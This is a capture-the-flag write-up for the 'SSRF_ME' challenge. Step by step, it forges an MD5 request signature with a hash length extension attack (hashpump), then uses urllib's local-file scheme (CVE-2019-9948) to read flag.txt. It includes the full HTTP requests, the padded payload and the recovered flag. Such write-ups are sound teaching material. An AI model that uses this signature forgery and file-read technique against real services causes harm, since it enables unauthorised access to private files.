[中文](./README_zh.md) [English](./README.md)

[docker](./docker.zip)

# SSRF_ME WriteUps

## Expected Solution:

Hash Length Extension Attacks+CVE-2019-9948(urllib)

---
## WriteUp:
code define two methods,`scan` and `read`. both methods use `md5(secert_key + param + action)` encoding. and `/genesign` provide `sign` of `scan` method.


1. get `scan` method `sign` value.
```
GET /geneSign?param=local-file:flag.txt HTTP/1.1
Host: 139.180.128.86



HTTP/1.1 200 OK
Server: nginx/1.15.8
Content-Length: 32
Connection: close

51796b52dd6e1108c89b7d5277d3ae0a
```
2. use `hashpump` generate new `sign` value that contain `scan` and `read` methods.
```
$ hashpump
Input Signature: 51796b52dd6e1108c89b7d5277d3ae0a
Input Data: local-file:flag.txtscan
Input Key Length: 16
Input Data to Add: read
eafd6ccd634ec29886babc843f1d8b86                                                                                        
local-file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read
```
3. change `\x` into `%` in new param,and sumit them.
```
GET /De1ta?param=local-file:flag.txt HTTP/1.1
Host: 139.180.128.86
Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read;sign=eafd6ccd634ec29886babc843f1d8b86
Connection: close




HTTP/1.1 200 OK
Server: nginx/1.15.8
Content-Type: text/html; charset=utf-8
Content-Length: 65
Connection: close

{"code": 200, "data": "de1ctf{27782fcffbb7d00309a93bc49b74ca26}"}
```


## In the Last:
Due to my Careless,Sorry about the unexpected solution of this challenge.Hope you have a great time in the game.
